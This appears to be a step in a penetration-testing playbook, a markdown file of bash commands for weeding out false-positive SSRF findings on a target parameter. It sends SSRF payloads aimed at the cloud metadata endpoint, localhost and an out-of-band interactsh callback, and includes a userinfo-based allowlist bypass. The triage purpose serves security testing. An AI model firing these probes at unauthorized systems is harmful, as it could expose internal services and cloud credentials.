# SSRF — False Positive Filter

## Purpose
Eliminate false SSRF signals from URL parsers that validate but don't fetch, SSRF-like parameters that redirect client-side, CDN/proxy interference, and DNS resolution artifacts that appear exploitable but are not.

## Required Variables
- `$TARGET_URL` — target endpoint
- `$VULN_PARAM` — SSRF candidate parameter
- `$OUTDIR` — output root

## Commands

### Filter 1: Client-Side Redirect (Not SSRF)

```bash
# redirect=/next= params often do client-side 302, not server-side fetch
HTTP_CODE=$(curl -s -o /dev/null -w '%{http_code}' "$TARGET_URL?${VULN_PARAM}=http://169.254.169.254/")
REDIRECT_LOC=$(curl -sI "$TARGET_URL?${VULN_PARAM}=http://169.254.169.254/" | grep -i 'location:')

if [ "$HTTP_CODE" = "302" ] || [ "$HTTP_CODE" = "301" ]; then
  echo "[FP] Response is a redirect (HTTP $HTTP_CODE). Header: $REDIRECT_LOC"
  echo "The target is telling the browser to redirect, not fetching server-side."
  echo "[FP-CLIENT] Client-side redirect — not SSRF" >> "$OUTDIR/ssrf/fp_notes.txt"
fi

# Verify by testing with a non-resolvable domain
curl -s "$TARGET_URL?${VULN_PARAM}=http://thisdomaindoesnotexist123456.com/" -o /dev/null -w "HTTP %{http_code} | %{time_total}s\n"
# Fast response on non-existent domain = not actually resolving server-side
```

### Filter 2: URL Parser That Validates but Doesn't Fetch

```bash
# Some apps parse the URL structure (validate format) but never make HTTP requests
# Test by providing valid format but unreachable host
TIME_VALID=$(curl -s -o /dev/null -w '%{time_total}' "$TARGET_URL?${VULN_PARAM}=http://10.255.255.255:81/")
TIME_INVALID=$(curl -s -o /dev/null -w '%{time_total}' "$TARGET_URL?${VULN_PARAM}=not_a_url")

echo "Valid URL response: ${TIME_VALID}s" | tee "$OUTDIR/ssrf/timing_url_format.txt"
echo "Invalid URL response: ${TIME_INVALID}s" | tee -a "$OUTDIR/ssrf/timing_url_format.txt"

# If both return in similar time, the app isn't actually connecting to the URL
(( $(echo "$TIME_VALID < $TIME_INVALID + 0.5" | bc -l) )) && \
  echo "[FP] Similar response times — URL parsed but not fetched" >> "$OUTDIR/ssrf/fp_notes.txt"
```

### Filter 3: CDN / Proxy Interference

```bash
# Cloudflare Workers or proxies may make the request, not the origin
# Check response headers for proxy indicators
curl -sI "$TARGET_URL?${VULN_PARAM}=http://${INTERACTSH_URL}/test" | grep -iE 'cf-ray|x-forwarded|via:|x-cache|x-amz-' > "$OUTDIR/ssrf/proxy_headers.txt"

[ -s "$OUTDIR/ssrf/proxy_headers.txt" ] && \
  echo "[FP-ATTENUATED] CDN/proxy in front — SSRF may exist but impact is limited to edge, not origin" >> "$OUTDIR/ssrf/fp_notes.txt"

# Check if interactsh User-Agent matches origin or CDN
jq -r '.[].request' "$OUTDIR/ssrf/interactsh_output.json" 2>/dev/null | head -5
```

### Filter 4: DNS Resolution but No HTTP Connection

```bash
# Some apps resolve the hostname (triggering DNS callback) but block the outbound HTTP
# DNS callback received but no HTTP callback
DNS_COUNT=$(jq '[.[] | select(.protocol=="dns")] | length' "$OUTDIR/ssrf/interactsh_output.json" 2>/dev/null)
HTTP_COUNT=$(jq '[.[] | select(.protocol=="http")] | length' "$OUTDIR/ssrf/interactsh_output.json" 2>/dev/null)

echo "DNS callbacks: $DNS_COUNT | HTTP callbacks: $HTTP_COUNT"

if [ "$DNS_COUNT" -gt 0 ] && [ "$HTTP_COUNT" -eq 0 ]; then
  echo "[FP-PARTIAL] DNS resolved but HTTP not sent — SSRF is blind DNS only (Medium severity)" >> "$OUTDIR/ssrf/fp_notes.txt"
fi
```

### Filter 5: Same-Origin / Allowlist Enforcement

```bash
# Test if the URL param is restricted to same-origin or specific domains
# Try an internal IP — if blocked with "invalid URL" or "domain not allowed"
curl -s "$TARGET_URL?${VULN_PARAM}=http://127.0.0.1/" > "$OUTDIR/ssrf/allowlist_test.txt"

grep -qi 'invalid\|not allowed\|domain\|whitelist\|permitted\|blocked\|restricted\|forbidden' "$OUTDIR/ssrf/allowlist_test.txt" && \
  echo "[FP] URL allowlist enforced — only specific domains accepted" >> "$OUTDIR/ssrf/fp_notes.txt"

# Test if allowlist can be bypassed via parser inconsistencies
curl -s "$TARGET_URL?${VULN_PARAM}=http://allowed.com@127.0.0.1/" > "$OUTDIR/ssrf/allowlist_bypass_userinfo.txt"
```

### Filter 6: Redirect Chain Noise

```bash
# Target may follow redirects to attacker URL — not direct SSRF
# Use a 302 redirect from your controlled domain to internal IP
# If the 302 is what triggers the internal access, it's an open redirect + SSRF chain
# not a direct SSRF — lower impact classification
```

### Filter 7: Localhost Response Identical to Error Page

```bash
# Many apps return their generic error/404 page when connection to localhost fails
# Compare response body of localhost probe with known 404/error page
ERROR_TEMPLATE=$(curl -s "$TARGET_URL/nonexistent_page_99999")
LOCALHOST_RESP=$(curl -s "$TARGET_URL?${VULN_PARAM}=http://127.0.0.1/")

ERROR_HASH=$(echo "$ERROR_TEMPLATE" | md5)
LH_HASH=$(echo "$LOCALHOST_RESP" | md5)

[ "$ERROR_HASH" = "$LH_HASH" ] && \
  echo "[FP] Localhost response body identical to 404/error page — connection likely failed" >> "$OUTDIR/ssrf/fp_notes.txt"
```

### Filter 8: Metadata Endpoint Returns HTML (Not JSON)

```bash
# Cloud metadata endpoints return structured JSON/text
# If the response is HTML (e.g. WAF block page, app error page), it's a false positive
curl -s "$TARGET_URL?${VULN_PARAM}=http://169.254.169.254/latest/meta-data/" | head -1 | grep -c '^[<!]' > /dev/null && \
  echo "[FP] Metadata endpoint returned HTML — likely WAF/app error, not actual metadata" >> "$OUTDIR/ssrf/fp_notes.txt"
```

### Filter Summary

```bash
echo "===== SSRF False Positive Summary =====" > "$OUTDIR/ssrf/fp_summary.txt"
echo "Parameter: $VULN_PARAM" >> "$OUTDIR/ssrf/fp_summary.txt"
echo "" >> "$OUTDIR/ssrf/fp_summary.txt"
echo "DNS callbacks: $DNS_COUNT | HTTP callbacks: $HTTP_COUNT" >> "$OUTDIR/ssrf/fp_summary.txt"
echo "" >> "$OUTDIR/ssrf/fp_summary.txt"
cat "$OUTDIR/ssrf/fp_notes.txt" 2>/dev/null >> "$OUTDIR/ssrf/fp_summary.txt"

# Determine if signal is real
if [ "$HTTP_COUNT" -gt 0 ]; then
  echo "[VERDICT] Confirmed SSRF — HTTP callbacks received" | tee -a "$OUTDIR/ssrf/fp_summary.txt"
elif [ "$DNS_COUNT" -gt 0 ]; then
  echo "[VERDICT] Blind SSRF only — DNS callbacks but no HTTP" | tee -a "$OUTDIR/ssrf/fp_summary.txt"
elif grep -q '\[FP\]' "$OUTDIR/ssrf/fp_notes.txt" 2>/dev/null; then
  echo "[VERDICT] False positive — no outbound connectivity" | tee -a "$OUTDIR/ssrf/fp_summary.txt"
else
  echo "[VERDICT] Inconclusive — further testing with bypasses needed" | tee -a "$OUTDIR/ssrf/fp_summary.txt"
fi
```

## Detection Signals
- HTTP callback via interactsh → real SSRF
- DNS-only callback → blind SSRF
- Client-side redirect (301/302) → not SSRF
- URL parsed but not fetched → not SSRF
- Same-origin allowlist enforced → filtered SSRF (may be bypassable)

## Next
├── Confirmed SSRF → proceed to `03-verify.md` or `04-impact-escalation.md`
├── Blind SSRF (DNS only) → test DNS rebinding for escalation in `03-verify.md`
├── All `[FP]` markers → remove from findings; test remaining params
├── Allowlist enforced → test bypass techniques from `03-verify.md`
└── Always → save `fp_summary.txt` and verdict before final findings list